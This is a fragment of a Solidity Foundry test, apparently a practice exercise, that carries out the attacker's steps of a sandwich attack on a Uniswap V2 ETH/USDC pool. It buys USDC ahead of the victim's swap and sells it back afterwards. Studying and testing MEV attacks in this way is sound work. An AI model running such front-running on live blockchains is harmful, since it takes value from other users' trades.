...
contract SandwichPracticeTest is SandwichSetUp {
    ...
    uint256 public attackEthAmountIn;
    uint256 public attackUsdcAmountOut;
    ...
    function _attackerAction1() internal {
        ...
        attackEthAmountIn = 2.6146637 ether;
        attackUsdcAmountOut = uniswapV2Router.getAmountsOut(attackEthAmountIn, path)[1]; 
        uniswapV2Router.swapExactETHForTokens{ value: attackEthAmountIn }(
            0,
            path,
            attacker,
            block.timestamp
    ...
    function _attackerAction2() internal {
        ...
        usdc.approve(address(uniswapV2Router), attackUsdcAmountOut);
        uniswapV2Router.swapExactTokensForETH(attackUsdcAmountOut, 0, path, attacker, block.timestamp);
        vm.stopPrank();
    }
